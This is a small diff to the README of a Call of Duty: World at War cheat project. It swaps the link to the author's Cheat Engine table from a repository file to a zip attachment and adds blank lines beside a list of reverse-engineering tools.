@@ -17,7 +17,9 @@ This cheat is based on my [D3D9 Hook ImGui](https://github.com/adamhlt/D3D9-Hook
 - [IDA Pro](https://hex-rays.com/ida-pro/)
 - [Ghidra](https://ghidra-sre.org/)
 
-You can look at my Cheat Engine table (incomplete but can help) [here](https://github.com/adamhlt/COD-WAW-Cheat/blob/main/Ressources/CoDWaW.CT).
+You can look at my Cheat Engine table (incomplete but can help) [here](https://github.com/adamhlt/COD-WAW-Cheat/files/8765876/Zombie.Cheat.Engine.zip).
+
+
 
 #### Used librairies :
 
